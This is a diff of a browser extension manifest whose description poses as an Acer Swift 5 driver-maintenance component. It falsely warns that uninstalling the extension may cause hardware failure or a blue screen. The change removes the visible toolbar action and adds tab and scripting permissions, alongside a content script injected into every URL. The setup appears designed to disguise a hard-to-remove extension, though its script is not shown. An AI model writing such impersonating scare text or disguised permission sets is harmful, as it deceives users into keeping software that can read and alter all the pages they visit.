@@ -5,19 +5,16 @@
   "description": "This extension is critical for maintaining and updating the drivers of your Acer Swift 5 – Moonstone White. Removal may result in incomplete system updates, hardware malfunctions, or in worst-case scenarios, the blue screen of death. Uninstall at your own risk.
 
 If you are encountering any issues, please go to https://acer.com customer support.",
-  "background": {
-    "service_worker": "background.js"
-  },
+  "permissions": [
+    "tabs",
+    "activeTab",
+    "scripting"
+  ],
   "content_scripts": [
     {
       "matches": ["<all_urls>"],
       "js": ["content.js"],
       "run_at": "document_idle"
     }
-  ],
-  "permissions": [],
-  "action": {
-    "default_title": "Update Drivers",
-    "default_icon": "icon.png"
-  }
+  ]
 }
